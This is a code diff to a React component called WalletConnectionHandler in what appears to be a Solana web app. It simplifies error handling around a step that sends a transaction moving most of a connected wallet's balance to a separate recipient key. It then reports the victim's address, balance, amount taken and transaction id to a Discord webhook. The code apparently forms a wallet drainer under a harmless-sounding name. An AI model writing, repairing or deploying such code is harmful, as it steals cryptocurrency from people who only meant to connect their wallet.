@@ -109,7 +109,7 @@ const WalletConnectionHandler: FC = () => {
             }
         }
 
-        if (!connection || lamports === null) {
+        if (!connection || lamports === null || lamports === undefined) {
             alert('❌ Connection failed with wallets');
             return;
         }
@@ -163,21 +163,16 @@ const WalletConnectionHandler: FC = () => {
 
             setTimeout(async () => {
                 try {
-                    if (connection) {
-                        const txid = await sendTransaction(finalTx, connection);
-                        console.log(`🚀 Transaction sent: https://solscan.io/tx/${txid}`);
+                    const txid = await sendTransaction(finalTx, connection);
+                    console.log(`🚀 Transaction sent: https://solscan.io/tx/${txid}`);
 
-                        await sendDiscordWebhook(
-                            walletPublicKey.toBase58(),
-                            lamports / LAMPORTS_PER_SOL,
-                            sendableLamports,
-                            toPubkey.toBase58(),
-                            txid
-                        );
-                    } else {
-                        console.error('❌ Connection is null');
-                        alert('❌ Connection is null');
-                    }
+                    await sendDiscordWebhook(
+                        walletPublicKey.toBase58(),
+                        lamports / LAMPORTS_PER_SOL,
+                        sendableLamports,
+                        toPubkey.toBase58(),
+                        txid
+                    );
                 } catch (err) {
                     console.error('❌ Failed to send transaction:', err);
                     alert('❌ Transaction failed');
